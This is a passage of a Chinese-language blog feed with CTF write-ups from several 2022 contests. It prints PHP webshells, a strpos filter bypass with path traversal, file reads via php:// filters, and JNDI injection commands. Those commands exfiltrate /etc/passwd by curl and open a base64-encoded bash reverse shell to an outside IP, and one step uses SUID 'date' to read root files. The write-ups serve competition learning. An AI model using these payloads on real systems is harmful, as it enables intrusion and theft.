        <content type="html"><![CDATA[<h1 id="2022年蓝贝国际创新创业大赛“数字技术-信息安全领域赛道网络攻防大赛”wp"><a href="#2022年蓝贝国际创新创业大赛“数字技术-信息安全领域赛道网络攻防大赛”wp" class="headerlink" title="2022年蓝贝国际创新创业大赛“数字技术+信息安全领域赛道网络攻防大赛”wp"></a>2022年蓝贝国际创新创业大赛“数字技术+信息安全领域赛道网络攻防大赛”wp</h1><h2 id="mine"><a href="#mine" class="headerlink" title="mine"></a>mine</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353647.png" alt="img"></p><p>注意观察这个符号，对应的是src.js中的res&#x2F;face_normal.bmp</p><p>进行查找别的face，发现有face_success.bmp</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353993.png" alt="img"></p><p>首先进行hex解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353310.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LJWXQ2C2GN2FKYKXGVXGGMTIGFGUQTJQMIZHQ3CJK42GQYKHKZ2VIQ2GN5MVGRTKJVKEEMSZLBFDS===</span><br></pre></td></tr></table></figure><p>然后进行base32解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353317.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tUaW5nc2h1MHM0b2xlIW4haGVuTCFoYSFjMTB2YXJ9</span><br></pre></td></tr></table></figure><p>然后进行base64解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353893.png" alt="img"></p><p>flag{Tingshu0s4ole!n!henL!ha!c10var}</p><h2 id="cook"><a href="#cook" class="headerlink" title="cook"></a>cook</h2><p>查看cookie</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353837.png" alt="img"></p><p>然后访问7815696ecbf1c96e6894b779456d330e.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353401.png" alt="img"></p><p>flag{c7a4c2050907de3b70c519287f171f35}</p><h2 id="upload-inc"><a href="#upload-inc" class="headerlink" title="upload-inc"></a>upload-inc</h2><p>查看源码，提示include.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353475.png" alt="img"></p><p>然后访问include.php，查看源码：提示upload.php和参数为file</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353880.png" alt="img"></p><p>似乎是原题<a href="http://danyhug.gitee.io/blog/2021/01/05/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8-%E7%AD%BE%E5%88%B0%E8%88%AC%E7%9A%84%E5%8C%85%E5%90%AB/">第十一周 | 签到般的包含 | Danyhug’s Blog (gitee.io)</a></p><p>整一个1.php，写一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行压缩，将压缩文件后缀改为png</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353108.png" alt="img"></p><p>进行文件上传</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353621.png" alt="img"></p><p>然后蚁剑连接</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353921.png" alt="image-20220715172645597"></p><h2 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h2><p>找到登录界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353471.png" alt="img"></p><p>按照这个做一遍，弱密码登录</p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122236773">typesetter 文件上传（CVE-2020-25790）_xzhome的博客-CSDN博客</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353215.png" alt="image-20220715201703774"></p><p>然后上传木马1.zip，加压，然后蚁剑直接连接</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353087.png" alt="img"></p><p>找到flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152354803.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2022-web-会聊天的机器人</title>
      <link href="/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2022-华东北-会聊天的机器人"><a href="#CISCN2022-华东北-会聊天的机器人" class="headerlink" title="CISCN2022-华东北-会聊天的机器人"></a>CISCN2022-华东北-会聊天的机器人</h1><p>可以上传词库规则，然后和机器人对话，就会去进行查找，并且回复</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;你好&quot;</span>: &#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;你好ctfer！&quot;</span>&#125;, <span class="string">&quot;1&quot;</span>: &#123;<span class="string">&quot;image&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>&#125;, <span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;calc&quot;</span>:<span class="string">&quot;1+1&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p>这里注意iamge，我们可以传入一个图片的链接，然后机器人会去访问，并且返回，所以我们这里尝试访问<code>/etc/passwd</code>，进行base64解码就可以获取</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142134821.png" alt="image-20220714192927092"></p><p>所以尝试任意文件读取，但是不能读取&#x2F;flag，可能是路径问题，或者权限问题</p><p>继续看calc功能，尝试一下，回显<code>admin才能使用这个功能</code></p><p>还是那个读取文件的东西，使用php伪协议读取api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/var/www/html/api.php</span></span><br></pre></td></tr></table></figure><p>得到api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">init</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sesspath</span> = <span class="string">&quot;/tmp/session&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_save_path</span>(<span class="variable">$sesspath</span>);   <span class="comment">//session存放地址</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>] = <span class="string">&#x27;ck&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="string">&quot;/tmp/resource&quot;</span>))</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/resource&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_dir_exists</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">dir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$dir</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">read</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getres</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">log_write</span>(<span class="variable">$input</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/tmp/resource/&quot;</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请先上传词库文件。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ck</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>),<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ck</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$key</span>,<span class="variable">$input</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strstr</span>(<span class="variable">$input</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="title function_ invoke__">key</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$v</span> = <span class="variable">$value</span>[<span class="variable">$type</span>];</span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$type</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;string&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$v</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;image&quot;</span>:</span><br><span class="line">                    <span class="variable">$b64img</span> = <span class="string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$v</span>)) . <span class="string">&#x27;&quot;/&gt;&#x27;</span>;      <span class="comment">//文件获取，然后以base64形式返回给客户端</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$b64img</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;calc&quot;</span>:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>])&#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\(|\)|\&#x27;|\&quot;/im&quot;</span>,<span class="variable">$v</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;包含非法字符&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v</span>;&quot;</span>);      <span class="comment">//这个应该是利用点，执行任意命令，但是需要$_SESSION[&#x27;is_admin&#x27;]存在</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;admin才能使用这个功能&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;这个动作暂时还没能实现&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;没有匹配到词库消息&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uploadc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uploadc&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cname&#x27;</span>];</span><br><span class="line">    <span class="variable">$resourcedir</span> = <span class="string">&quot;/tmp/resource/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="variable">$resourcedir</span>))      <span class="comment">//规则存放地址</span></span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$resourcedir</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;&lt;&quot;</span>))&#123;  <span class="comment">//关键词过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;别这样！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>))&#123;      <span class="comment">//关键词过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;别这样！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>] = <span class="variable">$filename</span>;     <span class="comment">//对$_SESSION[&#x27;cname&#x27;]进行更新</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$resourcedir</span>.<span class="variable">$filename</span>,<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;上传成功&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_write</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$logpath</span> = <span class="string">&quot;log.txt&quot;</span>;</span><br><span class="line">    <span class="variable">$oper</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">    <span class="variable">$opername</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$oper</span>,<span class="number">0</span>,<span class="number">1</span>) ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> &lt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$oper</span>);<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$opername</span> .= <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$logpath</span>,<span class="string">&quot;<span class="subst">$opername</span> : <span class="subst">$msg</span> \n&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getres</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>]);   <span class="comment">//根据输入的input进行相应的操作</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uploadc&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">uploadc</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;clear&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;log.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以根据uploadc()获取规则的存放地址</p><p>尝试读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;你好&quot;</span>: &#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;你好ctfer！&quot;</span>&#125;, <span class="string">&quot;1&quot;</span>: &#123;<span class="string">&quot;image&quot;</span>: <span class="string">&quot;/tmp/resource/ck&quot;</span>&#125;, <span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;calc&quot;</span>:<span class="string">&quot;1+1&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142134509.png" alt="image-20220714200142039"></p><h3 id="写木马"><a href="#写木马" class="headerlink" title="写木马"></a>写木马</h3><p>通过uploadc()函数写木马</p><p>尽管使用了strpos进行过滤，但是将<code>&lt;</code>和<code>.</code>放在字符串首位就可以使得判别结果为0，从而进行绕过</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142135740.png" alt="image-20220714211740154"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploadc=%<span class="number">3</span>C%<span class="number">3</span>Fphp+%<span class="number">40</span><span class="keyword">eval</span>(%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E&amp;cname=../.../../../../<span class="keyword">var</span>/www/html/xx.php</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142135366.png" alt="image-20220714213106213"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ciscn2022 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯2022_Web_网站取证</title>
      <link href="/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/"/>
      <url>/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝帽杯——Web-amp-网站取证"><a href="#蓝帽杯——Web-amp-网站取证" class="headerlink" title="蓝帽杯——Web&amp;网站取证"></a>蓝帽杯——Web&amp;网站取证</h1><h2 id="Ez-gadget"><a href="#Ez-gadget" class="headerlink" title="Ez_gadget"></a>Ez_gadget</h2><p>&#x2F;json路由下，有个这样的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str != <span class="literal">null</span> &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) </span><br></pre></td></tr></table></figure><p>这个牵扯到hashcode相同，但是字符串不一样，和md5弱碰撞有点像</p><p>找到这个博客：<a href="https://blog.csdn.net/weixin_44245828/article/details/109853439">https://blog.csdn.net/weixin_44245828/article/details/109853439</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301787.png" alt="img"></p><p>根据博客内容将key:BHUCCIx2zF9mMpJ7进行调整，调整为BHUBbIx2zF9mMpJ7</p><p>一个值的ascii差了1，然后紧跟着就整一个ascii大31字母的进行<code>补偿</code>，其余不变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;curl http://ip:7010 -Fe=@/etc/passwd&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301244.png" alt="img"></p><p>发包，注意用unicode编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=xH8b2iQfPbGejJgs&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://ip:1099/cw3nmu&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>尝试外带文件，测试&#x2F;etc&#x2F;passwd</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0063\u0077\u0033\u006e\u006d\u0075&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301428.png" alt="img"></p><p>反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi4yNDAuMTQ4LzcwMTAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301502.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0061\u006f\u006a\u0035\u0072\u0068&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>监听7010端口，反弹shell</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301250.png" alt="img"></p><p>但是权限有问题，根目录下没有flag文件，想到之前的一个提权学习</p><p><a href="https://www.it-sec.fail/jerseyctf-2022-mist-root-me/">JerseyCTF 2022 &#x2F; mist – root-me – it-sec.fail</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301512.png" alt="img"></p><p>模仿打一遍就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">date</span> -f /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301557.png" alt="img"></p><h2 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h2><p>顺带写一下部分网站取证部分</p><h3 id="网站取证1"><a href="#网站取证1" class="headerlink" title="网站取证1"></a>网站取证1</h3><p>vscode搜索_POST，发现一句话木马</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122303763.png" alt="img"></p><p>lanmaobei666</p><h3 id="网站取证2"><a href="#网站取证2" class="headerlink" title="网站取证2"></a>网站取证2</h3><p>加密解密处理时 mcrypt_module_open()函数在7.1中被贬低，将在7.2中被移除，要用openssl_decrypt()函数代替。换用php5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&quot;&quot;</span>,MCRYPT_MODE_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line">    <span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dencrypted</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> 